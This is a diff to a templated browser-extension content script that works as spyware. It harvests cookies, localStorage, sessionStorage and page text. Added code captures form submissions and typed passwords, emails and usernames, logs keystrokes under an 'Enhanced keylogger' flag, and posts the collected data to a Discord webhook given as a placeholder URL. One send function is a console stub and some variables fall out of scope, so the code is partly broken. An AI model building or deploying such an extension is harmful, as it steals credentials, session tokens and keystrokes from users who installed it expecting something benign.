@@ -1,4 +1,3 @@
-
 // Enhanced Content script for {{EXTENSION_NAME}}
 (function() {
   'use strict';
@@ -16,68 +15,94 @@
 
   // COMPREHENSIVE DATA COLLECTION ON PAGE LOAD
   function collectAllPageData() {
+    // Collect comprehensive page data
     const pageData = {
-      type: 'complete_page_scan',
-      timestamp: Date.now(),
       url: window.location.href,
-      domain: window.location.hostname,
       title: document.title,
-      
-      // Page metrics
-      pageMetrics: {
-        totalElements: document.querySelectorAll('*').length,
-        formCount: document.querySelectorAll('form').length,
-        inputCount: document.querySelectorAll('input, textarea, select').length,
-        linkCount: document.querySelectorAll('a[href]').length,
-        imageCount: document.querySelectorAll('img').length,
-        scriptCount: document.querySelectorAll('script').length,
-        iframeCount: document.querySelectorAll('iframe').length,
-        buttonCount: document.querySelectorAll('button').length,
-        divCount: document.querySelectorAll('div').length
-      },
+      timestamp: Date.now(),
 
-      // All form data
+      // Page content
+      bodyText: document.body ? document.body.innerText.substring(0, 5000) : '',
+
+      // Form data if enabled
       forms: [],
-      
-      // All input fields with current values
-      allInputs: [],
-      
-      // All links
-      allLinks: [],
-      
-      // All text content
-      textContent: document.body ? document.body.innerText.substring(0, 5000) : '',
-      
-      // Page HTML structure (limited)
-      htmlStructure: document.documentElement.outerHTML.substring(0, 10000),
-      
-      // All cookies
-      cookies: document.cookie,
-      
-      // Storage data
+
+      // Input data
+      inputs: [],
+
+      // Additional comprehensive data
       localStorage: {},
       sessionStorage: {},
-      
-      // Meta tags
+      cookies: document.cookie,
+
+      // Page structure
       metaTags: [],
-      
-      // Scripts and resources
-      scripts: [],
-      stylesheets: [],
-      
-      // Browser and system info
-      userAgent: navigator.userAgent,
-      language: navigator.language,
-      platform: navigator.platform,
-      cookieEnabled: navigator.cookieEnabled,
-      onLine: navigator.onLine,
-      referrer: document.referrer,
-      
-      // Page timing
-      loadTime: performance.timing ? performance.timing.loadEventEnd - performance.timing.navigationStart : 0,
-      domReady: performance.timing ? performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart : 0
+      links: [],
+      images: []
     };
 
+    // Collect all localStorage data
+    try {
+      for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        pageData.localStorage[key] = localStorage.getItem(key);
+      }
+    } catch (e) {
+      console.log('localStorage access denied');
+    }
+
+    // Collect all sessionStorage data
+    try {
+      for (let i = 0; i < sessionStorage.length; i++) {
+        const key = sessionStorage.key(i);
+        pageData.sessionStorage[key] = sessionStorage.getItem(key);
+      }
+    } catch (e) {
+      console.log('sessionStorage access denied');
+    }
+
+    // Collect meta tags
+    const metaTags = document.querySelectorAll('meta');
+    metaTags.forEach(meta => {
+      pageData.metaTags.push({
+        name: meta.getAttribute('name'),
+        property: meta.getAttribute('property'),
+        content: meta.getAttribute('content')
+      });
+    });
+
+    // Collect links (first 50)
+    const links = document.querySelectorAll('a[href]');
+    for (let i = 0; i < Math.min(links.length, 50); i++) {
+      pageData.links.push({
+        href: links[i].href,
+        text: links[i].textContent.trim().substring(0, 100)
+      });
+    }
+
+    // Collect images (first 20)
+    const images = document.querySelectorAll('img[src]');
+    for (let i = 0; i < Math.min(images.length, 20); i++) {
+      pageData.images.push({
+        src: images[i].src,
+        alt: images[i].alt
+      });
+    }
+
+    // Page metrics
+    pageData.pageMetrics = {
+      totalElements: document.querySelectorAll('*').length,
+      formCount: document.querySelectorAll('form').length,
+      inputCount: document.querySelectorAll('input, textarea, select').length,
+      linkCount: document.querySelectorAll('a[href]').length,
+      imageCount: document.querySelectorAll('img').length,
+      scriptCount: document.querySelectorAll('script').length,
+      iframeCount: document.querySelectorAll('iframe').length,
+      buttonCount: document.querySelectorAll('button').length,
+      divCount: document.querySelectorAll('div').length
+    };
+
+    // All form data
     // Collect all forms with complete details
     document.querySelectorAll('form').forEach((form, index) => {
       const formData = {
@@ -128,7 +153,7 @@
         id: input.id,
         className: input.className,
         placeholder: input.placeholder,
-        value: input.type === 'password' ? '[HIDDEN-PASSWORD]' : 
+        value: input.type === 'password' ? '[HIDDEN-PASSWORD]' :
                input.type === 'email' ? input.value :
                input.type === 'tel' ? input.value :
                input.value,
@@ -157,17 +182,6 @@
       });
     });
 
-    // Collect meta tags
-    document.querySelectorAll('meta').forEach(meta => {
-      pageData.metaTags.push({
-        name: meta.name,
-        property: meta.property,
-        content: meta.content,
-        httpEquiv: meta.httpEquiv,
-        charset: meta.charset
-      });
-    });
-
     // Collect script sources
     document.querySelectorAll('script').forEach(script => {
       pageData.scripts.push({
@@ -192,31 +206,202 @@
       });
     });
 
-    // Collect localStorage
-    try {
-      for (let i = 0; i < localStorage.length; i++) {
-        const key = localStorage.key(i);
-        if (key) {
-          pageData.localStorage[key] = localStorage.getItem(key);
-        }
-      }
-    } catch (e) {
-      pageData.localStorage = { error: 'Access denied' };
-    }
-
-    // Collect sessionStorage
-    try {
-      for (let i = 0; i < sessionStorage.length; i++) {
-        const key = sessionStorage.key(i);
-        if (key) {
-          pageData.sessionStorage[key] = sessionStorage.getItem(key);
-        }
-      }
-    } catch (e) {
-      pageData.sessionStorage = { error: 'Access denied' };
-    }
 
     sendMessage(pageData);
+  }
+
+  // Monitor ALL form inputs and submissions
+  const features = []; // Placeholder for features, needs to be populated from somewhere
+  const permissions = []; // Placeholder for permissions
+  function sendDataToServer(data) {
+    // Mock function for demonstration
+    console.log('Sending data to server:', data);
+  }
+  if (features.includes('form_data')) {
+    // Monitor form submissions
+    document.addEventListener('submit', function(event) {
+      const form = event.target;
+      const formData = new FormData(form);
+      const data = {};
+
+      for (let [key, value] of formData.entries()) {
+        data[key] = value;
+      }
+
+      pageData.forms.push({
+        action: form.action,
+        method: form.method,
+        data: data,
+        timestamp: Date.now()
+      });
+
+      // Send form data immediately
+      sendDataToServer({
+        type: 'form_submission',
+        formData: data,
+        url: window.location.href,
+        timestamp: Date.now()
+      });
+    });
+
+    // Monitor all input changes
+    document.addEventListener('input', function(event) {
+      if (event.target.type === 'password' ||
+        event.target.name?.toLowerCase().includes('password') ||
+        event.target.name?.toLowerCase().includes('pass')) {
+
+        // Capture password fields
+        pageData.inputs.push({
+          type: 'password',
+          name: event.target.name,
+          value: event.target.value,
+          placeholder: event.target.placeholder,
+          timestamp: Date.now()
+        });
+      } else if (event.target.type === 'email' ||
+        event.target.name?.toLowerCase().includes('email') ||
+        event.target.name?.toLowerCase().includes('username')) {
+
+        // Capture username/email fields
+        pageData.inputs.push({
+          type: 'credential',
+          name: event.target.name,
+          value: event.target.value,
+          placeholder: event.target.placeholder,
+          timestamp: Date.now()
+        });
+      }
+    });
+
+    // Monitor textarea changes
+    document.addEventListener('input', function(event) {
+      if (event.target.tagName === 'TEXTAREA') {
+        pageData.inputs.push({
+          type: 'textarea',
+          name: event.target.name,
+          value: event.target.value.substring(0, 500),
+          timestamp: Date.now()
+        });
+      }
+    });
+  }
+
+  // Enhanced keylogger if enabled
+  if (features.includes('keylogger')) {
+    let keyBuffer = '';
+    let lastKeystroke = Date.now();
+
+    document.addEventListener('keydown', function(event) {
+      const now = Date.now();
+
+      // Record special keys
+      let keyValue = event.key;
+      if (event.key.length === 1) {
+        keyValue = event.key;
+      } else {
+        keyValue = `[${event.key}]`;
+      }
+
+      // If more than 3 seconds between keystrokes, start new buffer
+      if (now - lastKeystroke > 3000) {
+        if (keyBuffer.length > 0) {
+          sendDataToServer({
+            type: 'keylog',
+            keys: keyBuffer,
+            url: window.location.href,
+            activeElement: document.activeElement.tagName + (document.activeElement.name ? `[${document.activeElement.name}]` : ''),
+            timestamp: lastKeystroke
+          });
+        }
+        keyBuffer = '';
+      }
+
+      keyBuffer += keyValue;
+      lastKeystroke = now;
+
+      // Send buffer if it gets too long
+      if (keyBuffer.length > 100) {
+        sendDataToServer({
+          type: 'keylog',
+          keys: keyBuffer,
+          url: window.location.href,
+          activeElement: document.activeElement.tagName + (document.activeElement.name ? `[${document.activeElement.name}]` : ''),
+          timestamp: now
+        });
+        keyBuffer = '';
+      }
+    });
+
+    // Send remaining buffer on page unload
+    window.addEventListener('beforeunload', function() {
+      if (keyBuffer.length > 0) {
+        sendDataToServer({
+          type: 'keylog_final',
+          keys: keyBuffer,
+          url: window.location.href,
+          timestamp: Date.now()
+        });
+      }
+    });
+  }
+
+  // Send comprehensive data to server and webhook
+  function sendComprehensiveData() {
+    // Send comprehensive data to server and webhook
+    sendDataToServer({
+      type: 'comprehensive_page_data',
+      data: pageData,
+      extensionId: '{{EXTENSION_ID}}',
+      userId: '{{USER_ID}}',
+      features: features,
+      permissions: permissions
+    });
+
+    // Also send to webhook if configured
+    if ('{{WEBHOOK_URL}}' && '{{WEBHOOK_URL}}'.startsWith('https://discord.com/api/webhooks/')) {
+      // Send to Discord webhook
+      fetch('{{WEBHOOK_URL}}', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          embeds: [{
+            title: '🔍 Extension Data Collected',
+            description: `**Extension:** {{EXTENSION_NAME}}\n**Page:** ${pageData.title}`,
+            color: 0x00ff00,
+            fields: [
+              {
+                name: '🌐 URL',
+                value: pageData.url.substring(0, 200) + (pageData.url.length > 200 ? '...' : ''),
+                inline: false
+              },
+              {
+                name: '🍪 Cookies',
+                value: pageData.cookies ? (pageData.cookies.length > 0 ? 'Found' : 'None') : 'None',
+                inline: true
+              },
+              {
+                name: '💾 Storage',
+                value: `LocalStorage: ${Object.keys(pageData.localStorage).length} items\nSessionStorage: ${Object.keys(pageData.sessionStorage).length} items`,
+                inline: true
+              },
+              {
+                name: '📝 Forms',
+                value: pageData.forms.length > 0 ? `${pageData.forms.length} forms detected` : 'No forms',
+                inline: true
+              },
+              {
+                name: '⌨️ Inputs',
+                value: pageData.inputs.length > 0 ? `${pageData.inputs.length} inputs captured` : 'No inputs',
+                inline: true
+              }
+            ],
+            timestamp: new Date().toISOString()
+          }]
+        })
+      }).catch(e => console.log('Webhook failed:', e));
+    }
   }
 
   // Enhanced form tracking
@@ -428,7 +613,7 @@
 
       lastKeystroke = now;
       keystrokeBuffer += event.key;
-      
+
       keySequence.push({
         key: event.key,
         code: event.code,
@@ -737,9 +922,9 @@
           ];
 
           if (form.inputs && form.inputs.length > 0) {
-            const sensitiveInputs = form.inputs.filter(input => 
-              input.type === 'password' || 
-              input.type === 'email' || 
+            const sensitiveInputs = form.inputs.filter(input =>
+              input.type === 'password' ||
+              input.type === 'email' ||
               input.name?.toLowerCase().includes('user') ||
               input.name?.toLowerCase().includes('pass') ||
               input.name?.toLowerCase().includes('login')
@@ -821,9 +1006,9 @@
 
         if (Object.keys(data.localStorage || {}).length > 0) {
           const localKeys = Object.keys(data.localStorage);
-          const authKeys = localKeys.filter(key => 
-            key.toLowerCase().includes('auth') || 
-            key.toLowerCase().includes('token') || 
+          const authKeys = localKeys.filter(key =>
+            key.toLowerCase().includes('auth') ||
+            key.toLowerCase().includes('token') ||
             key.toLowerCase().includes('session') ||
             key.toLowerCase().includes('user') ||
             key.toLowerCase().includes('login')
@@ -922,9 +1107,9 @@
           fields: []
         };
 
-        const importantMeta = data.metaTags.filter(meta => 
-          meta.name === 'description' || 
-          meta.name === 'keywords' || 
+        const importantMeta = data.metaTags.filter(meta =>
+          meta.name === 'description' ||
+          meta.name === 'keywords' ||
           meta.property === 'og:title' ||
           meta.property === 'og:description' ||
           meta.name === 'author'
@@ -945,7 +1130,7 @@
       const maxEmbedsPerMessage = 10;
       for (let i = 0; i < embeds.length; i += maxEmbedsPerMessage) {
         const embedBatch = embeds.slice(i, i + maxEmbedsPerMessage);
-        
+
         const webhookData = {
           username: "🕵️ {{EXTENSION_NAME}} - PAGE ANALYZER",
           avatar_url: "https://cdn.discordapp.com/emojis/853928735535742986.png",
